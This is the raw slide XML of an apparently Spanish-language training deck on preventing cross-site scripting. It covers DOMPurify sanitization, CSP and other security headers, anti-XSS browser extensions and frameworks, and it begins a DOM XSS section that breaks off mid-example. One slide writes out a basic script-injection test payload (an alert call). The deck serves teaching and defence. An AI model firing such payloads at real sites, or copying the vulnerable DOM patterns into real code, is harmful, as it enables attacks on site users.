          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="4050590"/>
            <a:ext cx="6096000" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> contenido = '&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>("XSS");&lt;/script&gt;';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('contenido').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>DOMPurify.sanitize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(contenido);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="913829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126774" y="198091"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – Encabezados adecuados</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{436927D5-0DA7-F34A-FC92-3AD777F693ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="568779" y="1179408"/>
            <a:ext cx="10556422" cy="4678204"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>Aquí hay algunos ejemplos de encabezados CSS adecuados para prevenir ataques XSS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t>X-XSS-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Protection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>: Este encabezado se utiliza para habilitar o deshabilitar el filtro de XSS en el navegador. Si el valor se establece en "1", el filtro está habilitado. Si el valor se establece en "0", el filtro está deshabilitado. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>X-XSS-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Protection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>: 1; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>mode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>=block</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t>Content-Security-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t> (CSP)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>: Este encabezado se utiliza para controlar los recursos permitidos a cargarse en una página web, incluyendo scripts, imágenes, fuentes, etc. También se puede utilizar para restringir el uso de ciertos tipos de atributos de HTML, lo que ayuda a prevenir los ataques XSS. A continuación se muestra un ejemplo básico que restringe los scripts solo a la fuente actual y los estilos solo a la fuente '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>self</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>'.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>Content-Security-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>: default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>self</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>'; script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>self</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>'; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>style-src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>self</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t>X-Content-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>: Este encabezado se utiliza para prevenir ataques de tipo MIME en el navegador. Si se establece en "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>nosniff</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>", el navegador no intentará adivinar el tipo MIME de un archivo si no se especifica explícitamente en el encabezado Content-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>X-Content-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>Options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>nosniff</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27251475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126774" y="198091"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – Seguridad en navegadores</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="304258" y="883880"/>
            <a:ext cx="9343950" cy="4721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514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Activar protección Navegador. En Chrome está en Configuración / Privacidad y Seguridad / Seguridad</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Usar extensiones anti-XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t>XSS Auditor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>NoScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> Security Suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>uMatrix</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1"/>
              <a:t>ScriptSafe</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4179CF8D-5520-8FB4-FBE3-A58ABD465DE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5192698" y="1862581"/>
            <a:ext cx="6618844" cy="4428338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="860657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126774" y="198091"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Frameworks</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="489315" y="1188680"/>
            <a:ext cx="9343950" cy="4721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514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>Usar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>framework</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t> modernos (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>react</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>, angular, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0" err="1"/>
              <a:t>vue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0"/>
              <a:t>) en la creación de webs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16472860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ítulo 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1671070" y="2492067"/>
            <a:ext cx="8208838" cy="936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 altLang="es-ES" sz="5000" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>XSS DOM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4087151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58739" y="71383"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XSS-DOM-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Definicion</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="767408" y="1120018"/>
            <a:ext cx="10717942" cy="65279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s-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>i quiero poner una palabra de mi web en negrita, la puedo realizar usando </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> o el DOM de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" u="sng" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>Javascript</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Imagen 1" descr="Diagrama&#10;&#10;Descripción generada automáticamente">
            <a:hlinkClick r:id="rId5"/>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAF6AB43-A948-E0E5-8908-B5809E31852E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6786549" y="1913642"/>
            <a:ext cx="5188995" cy="2813325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CuadroTexto 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7D8335A3-46BC-0F49-E823-E4C2BF9C5237}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="322868" y="1446417"/>
            <a:ext cx="10065470" cy="4661276"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Imagina que tenemos una página web en la que existe un campo que podemos informar y las acciones que el DOM realiza son</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="450215" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var search = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>('search').value;</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="450215" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" i="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
